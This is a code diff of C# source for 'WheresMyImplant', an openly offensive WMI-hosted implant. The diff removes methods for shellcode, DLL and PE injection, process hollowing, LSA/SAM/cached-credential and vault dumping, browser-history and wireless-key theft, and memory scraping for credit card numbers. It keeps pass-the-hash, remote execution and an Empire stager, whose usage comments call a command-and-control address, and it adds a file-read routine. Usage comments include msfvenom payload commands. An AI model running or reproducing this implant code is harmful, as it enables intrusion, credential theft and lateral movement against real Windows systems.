@@ -1,11 +1,6 @@
 ﻿using System;
-using System.Collections;
-using System.Collections.Generic;
-using System.Collections.ObjectModel;
-using System.Configuration.Install;
 using System.Diagnostics;
 using System.Linq;
-using System.Management;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Management.Instrumentation;
@@ -14,54 +9,13 @@ using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Text;
 
+using Empire;
 
-using System.Reflection;
-
-[assembly: WmiConfiguration(@"root\cimv2", HostingModel = ManagementHostingModel.LocalSystem), AssemblyKeyFileAttribute("sgKey.snk")]
 namespace WheresMyImplant
 {
-
-    [System.ComponentModel.RunInstaller(true)]
-    public class MyInstall : DefaultManagementInstaller
-    {
-        public override void Install(IDictionary stateSaver)
-        {
-            try
-            {
-                new System.EnterpriseServices.Internal.Publish().GacInstall("WhereMyImplant.dll");
-                base.Install(stateSaver);
-                RegistrationServices registrationServices = new RegistrationServices();
-            }
-            catch (Exception error)
-            {
-                Console.WriteLine(error.ToString());
-            }
-        }
-
-        public override void Uninstall(IDictionary savedState)
-        {
-            try
-            {
-                new System.EnterpriseServices.Internal.Publish().GacRemove("WhereMyImplant.dll");
-                ManagementClass managementClass = new ManagementClass(@"root\cimv2:Win32_Implant");
-                managementClass.Delete();
-            }
-            catch { }
-
-            try
-            {
-                base.Uninstall(savedState);
-            }
-            catch (Exception error)
-            {
-                Console.WriteLine(error.ToString());
-            }
-        }
-    }
-
     [ComVisible(true)]
     [ManagementEntity(Name = "Win32_Implant")]
-    public class Implant
+    public partial class Implant
     {
         [ManagementTask]
         public static string RunCMD(string command, string parameters)
@@ -86,235 +40,6 @@ namespace WheresMyImplant
             return runXPCmdShell.GetOutput();
         }
         
-        [ManagementTask]
-        //msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
-        //Invoke-CimMethod -Class Win32_Implant -Name InjectShellCode -Argument @{shellCodeString=$payload; processId=432}
-        public static string InjectShellCode(string shellCodeString, String strProcessId)
-        {
-            Int32 dwProcessId = 0;
-            if (String.IsNullOrEmpty(strProcessId))
-            {
-                using (InjectShellCode injectShellCode = new InjectShellCode(shellCodeString))
-                {
-                    injectShellCode.Execute();
-                    return injectShellCode.GetOutput();
-                }
-            }
-            else if (Int32.TryParse(strProcessId, out dwProcessId))
-            {
-                using (InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)dwProcessId))
-                {
-                    injectShellCodeRemote.Execute();
-                    return injectShellCodeRemote.GetOutput();
-                }
-            }
-            else
-            {
-                return "Invalid Process ID";
-            }
-        }
-
-        [ManagementTask]
-        public static string InjectShellCodeWMIFSB64(String wmiClass, String fileName, Int32 processId)
-        {
-            Byte[] peBytes = Misc.QueryWMIFS(wmiClass, fileName);
-            String shellCodeString = System.Text.Encoding.Unicode.GetString(peBytes);
-
-            InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)processId);
-            return injectShellCodeRemote.GetOutput();
-        }
-
-        // Todo: Add Auto Token Privilege Elevation
-        [ManagementTask]
-        //http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread
-        //msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
-        //Invoke-CimMethod -ClassName Win32_Implant -Name InjectDll -Arguments @{library = "C:\bind64.dll"; processId = 3372}
-        public static String LoadDll(String library, String strProcessId)
-        {
-            Int32 dwProcessId = 0;
-            if (String.IsNullOrEmpty(strProcessId))
-            {
-                LoadDll injectDll = new LoadDll(library);
-                return injectDll.GetOutput();
-            }
-            else if (Int32.TryParse(strProcessId, out dwProcessId))
-            {
-                String output;
-                using (LoadDllRemote injectDllRemote = new LoadDllRemote(library, (UInt32)dwProcessId))
-                {
-                    UInt32 size = 0;
-                    //Misc.GetModuleAddress("kernel32.dll", (UInt32)dwProcessId, ref size);
-                    injectDllRemote.Execute();
-                    output = injectDllRemote.GetOutput();
-                }
-                return output;
-            }
-            else
-            {
-                return "Invalid Process ID";
-            }
-        }
-       
-        [ManagementTask]
-        //Invoke-CimMethod -ClassName Win32_Implant -Name InjectPeFromFileRemote -Arguments @{processId=5648; fileName="C:\bind64.exe"; parameters=""}
-        public static string InjectPeFile(Int32 processId, String fileName, String parameters)
-        {
-            using (PELoader peLoader = new PELoader())
-            {
-                peLoader.Execute(fileName);
-                InjectPERemote injectPE = injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
-                string output = "";
-
-                try
-                {
-                    injectPE.execute();
-                }
-                catch
-                {
-                    output = "[-] Execution Failed\n";
-                }
-                finally
-                {
-                    output += injectPE.GetOutput();
-                }
-                return output;
-            }
-        }
-
-        [ManagementTask]
-        public static string InjectPeString(Int32 processId, String peString, String parameters)
-        {
-            string output = "";
-
-            PELoader peLoader = new PELoader();
-            peLoader.Execute(System.Convert.FromBase64String(peString));
-
-            InjectPE injectPE = new InjectPE(peLoader, parameters);
-            output += injectPE.GetOutput();
-            return output;
-        }
-
-        [ManagementTask]
-        public static string InjectPeWMIFS(Int32 processId, String wmiClass, String fileName, String parameters)
-        {
-            string output = "";
-
-            Byte[] peBytes = Misc.QueryWMIFS(wmiClass, fileName);
-            PELoader peLoader = new PELoader();
-            peLoader.Execute(peBytes);
-
-            InjectPERemote injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
-            try
-            {
-               injectPE.execute();
-            }
-            catch
-            {
-               output = "[-] Execution Failed\n";
-            }
-            finally
-            {
-               output += injectPE.GetOutput();
-            }
-            return output;
-        }
-
-        [ManagementTask]
-        public static string InjectPeWMIFSRemote(Int32 processId, string wmiClass, string system, string username, string password, string fileName, string parameters)
-        {
-            string output = "";
-
-            ConnectionOptions options = new ConnectionOptions();
-
-            options.Username = username;
-            options.Password = password;
-
-            ManagementScope scope = new ManagementScope("\\\\" + system + "\\root\\cimv2", options);
-            scope.Connect();
-
-            ObjectQuery queryIndexCount = new ObjectQuery("SELECT Index FROM WMIFS WHERE FileName = \'" + fileName + "\'");
-            ManagementObjectSearcher searcherIndexCount = new ManagementObjectSearcher(scope, queryIndexCount);
-            ManagementObjectCollection queryIndexCollection = searcherIndexCount.Get();
-            int indexCount = queryIndexCollection.Count;
-
-            String EncodedText = "";
-            for (int i = 0; i < indexCount; i++)
-            {
-                ObjectQuery queryFilePart = new ObjectQuery("SELECT FileStore FROM WMIFS WHERE FileName = \'" + fileName + "\' AND Index = \'" + i + "\'");
-                ManagementObjectSearcher searcherFilePart = new ManagementObjectSearcher(scope, queryFilePart);
-                ManagementObjectCollection queryCollection = searcherFilePart.Get();
-                foreach (ManagementObject filePart in queryCollection)
-                {
-                    EncodedText += filePart["FileStore"].ToString();
-                }
-            }
-
-            byte[] peBytes = System.Convert.FromBase64String(EncodedText);
-            PELoader peLoader = new PELoader();
-            peLoader.Execute(peBytes);
-            InjectPERemote injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
-            try
-            {
-                injectPE.execute();
-            }
-            catch
-            {
-                output = "[-] Execution Failed\n";
-            }
-            finally
-            {
-                output += injectPE.GetOutput();
-            }
-            return output;
-        }
-
-        [ManagementTask]
-        public static String HollowProcess(String target, String replacement)
-        {
-            HollowProcess hp = new HollowProcess();
-            if (!hp.CreateSuspendedProcess(target))//@"C:\Windows\notepad.exe"))
-            {
-                return Misc.GetError();
-            }
-
-            if (!hp.ReadPEB())
-            {
-                return Misc.GetError();
-            }
-
-            if (!hp.GetTargetArch())
-            {
-                return Misc.GetError();
-            }
-
-            if (!hp.GetContext())
-            {
-                return Misc.GetError();
-            }
-
-            if (!hp.ReadNTHeaders())
-            {
-                return Misc.GetError();
-            }
-
-            if (!hp.ReadSourceImage(replacement))
-            {
-                return Misc.GetError();
-            }
-
-            if (!hp.RemapImage())
-            {
-                return Misc.GetError();
-            }
-
-            if (!hp.ResumeProcess64())
-            {
-                return Misc.GetError();
-            }
-
-            return "Process Hollowed";
-        }
-       
         [ManagementTask]
         //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "powershell","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
         //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "dotnet","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
@@ -394,134 +119,7 @@ namespace WheresMyImplant
             return tokenvator.GetOutput();
         }
 
-        [ManagementTask]
-        public static String DumpLsa()
-        {
-            StringBuilder output = new StringBuilder();
-            CheckPrivileges checkSystem = new CheckPrivileges();
-            String results = "";
-            if (checkSystem.GetSystem())
-            {
-                LSASecrets lsaSecrets = new LSASecrets();
-                lsaSecrets.DumpLSASecrets();
-                results = lsaSecrets.GetOutput();
-            }
-            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
-            return output.ToString();
-        }
-
-        [ManagementTask]
-        public static String DumpSAM()
-        {
-            StringBuilder output = new StringBuilder();
-            CheckPrivileges checkSystem = new CheckPrivileges();
-            String results = "";
-            if(checkSystem.GetSystem())
-            {
-                SAM sam = new SAM();
-                results = sam.GetOutput();
-            }
-            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
-            return output.ToString();
-        }
-
-        [ManagementTask]
-        public static String DumpDomainCache()
-        {
-            StringBuilder output = new StringBuilder();
-            CheckPrivileges checkSystem = new CheckPrivileges();
-            String results = "";
-            if(checkSystem.GetSystem())
-            {
-                CacheDump cacheDump = new CacheDump();
-                results = cacheDump.GetOutput();
-            }
-            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
-            return output.ToString();
-        }
-
-        [ManagementTask]
-        public static String DumpVault()
-        {
-            StringBuilder output = new StringBuilder();
-            Vault vault = new Vault();
-            vault.EnumerateCredentials();
-
-            CheckPrivileges checkSystem = new CheckPrivileges();
-            if (checkSystem.GetSystem())
-            {
-                vault = new Vault();
-                vault.EnumerateCredentials();
-            }
-            return output.ToString();
-        }
-
-        [ManagementTask]
-        public static String DumpVaultCLI()
-        {
-            VaultCLI vault = new VaultCLI();
-            vault.EnumerateVaults();
-            return vault.GetOutput();
-        }
-
-        [ManagementTask]
-        public static String DumpBrowserHistory()
-        {
-            BrowserHistory history = new BrowserHistory();
-            history.InternetExplorer();
-            history.Firefox();
-            history.Chrome();
-            return history.GetOutput();
-        }
-
-        [ManagementTask]
-        public static String ReadProcessMemory(String processId)
-        {
-            StringBuilder output = new StringBuilder();
-            Int32 pid;
-            if (!Int32.TryParse(processId, out pid))
-            {
-                return output.ToString();
-            }
-
-            ReadProcessMemory readProcessMemory = new ReadProcessMemory(pid);
-            if (!readProcessMemory.OpenProcess())
-            {
-                return output.ToString();
-            }
-            readProcessMemory.ReadProcesMemory();
-            output.Append(readProcessMemory.GetOutput());
-            output.Append("\n-----\n");
-            output.Append(CheckCCNumber(readProcessMemory.GetPrintableMemory()));
-            return output.ToString();
-        }
-
-        [ManagementTask]
-        public static String CheckCCNumber(String input)
-        {
-            StringBuilder output = new StringBuilder();
-            foreach (String number in CheckCreditCard.CheckString(input))
-            {
-                output.Append(number);
-            }
-            return output.ToString();
-        }
-
-        [ManagementTask]
-        public static String MiniDump(String processId, String fileName)
-        {
-            StringBuilder output = new StringBuilder();
-            Int32 pid;
-            if (!Int32.TryParse(processId, out pid))
-            {
-                return output.ToString();
-            }
-
-            MiniDumpWriteDump miniDump = new MiniDumpWriteDump();
-            miniDump.CreateMiniDump((UInt32)pid, fileName);
-            output.Append(miniDump.GetOutput());
-            return output.ToString();
-        }
+        
 
         //FormalChicken
         public static void StartSmbServer(String pipeName)
@@ -562,7 +160,7 @@ namespace WheresMyImplant
         }
 
         [ManagementTask]
-        public static void PSExec(String system, String execute, String isCommand)
+        public static void PSExecCommand(String system, String execute, String isCommand)
         {
             Boolean comspec;
             if (!Boolean.TryParse(isCommand, out comspec))
@@ -597,16 +195,6 @@ namespace WheresMyImplant
             }
         }
         */
-
-        [ManagementTask]
-        public static String WirelessPreSharedKey()
-        {
-            StringBuilder output = new StringBuilder();
-            WirelessProfiles wp = new WirelessProfiles();
-            wp.GetProfiles();
-            output.Append(wp.GetOutput());
-            return output.ToString();
-        }
 
         [ManagementTask]
         public static String PassTheHash(String target, String domain, String username, String hash)
@@ -653,11 +241,42 @@ namespace WheresMyImplant
         [ManagementTask]
         public static String Install()
         {
-            Install install = new Install(".", @"ROOT\cimv2", "Win32_Implant");
+            InstallWMI install = new InstallWMI(".", @"ROOT\cimv2", "Win32_Implant");
             install.GetMethods();
             install.AddRegistryLocal();
             install.CopyDll();
             return install.GetOutput();
+        }
+
+        [ManagementTask]
+        public static String GetFileBytes(String filePath, String base64)
+        {
+            Boolean bBase64 = false;
+            if (String.Empty == base64)
+            {
+                base64 = "false";
+            }
+            if (!Boolean.TryParse(base64, out bBase64))
+            {
+                return "";
+            }
+
+            Byte[] fileBytes;
+            using (System.IO.FileStream fileStream = new System.IO.FileStream(System.IO.Path.GetFullPath(filePath), System.IO.FileMode.Open, System.IO.FileAccess.Read, System.IO.FileShare.ReadWrite))
+            {
+                using (System.IO.BinaryReader binaryReader = new System.IO.BinaryReader(fileStream))
+                {
+                    fileBytes = new Byte[binaryReader.BaseStream.Length];
+                    binaryReader.Read(fileBytes, 0, (Int32)binaryReader.BaseStream.Length);
+                }
+            }
+
+            String strBytes = "0x" + BitConverter.ToString(fileBytes).Replace("-", ",0x");
+            if (bBase64)
+            {
+                return Convert.ToBase64String(fileBytes);
+            }
+            return strBytes;
         }
     }
 }
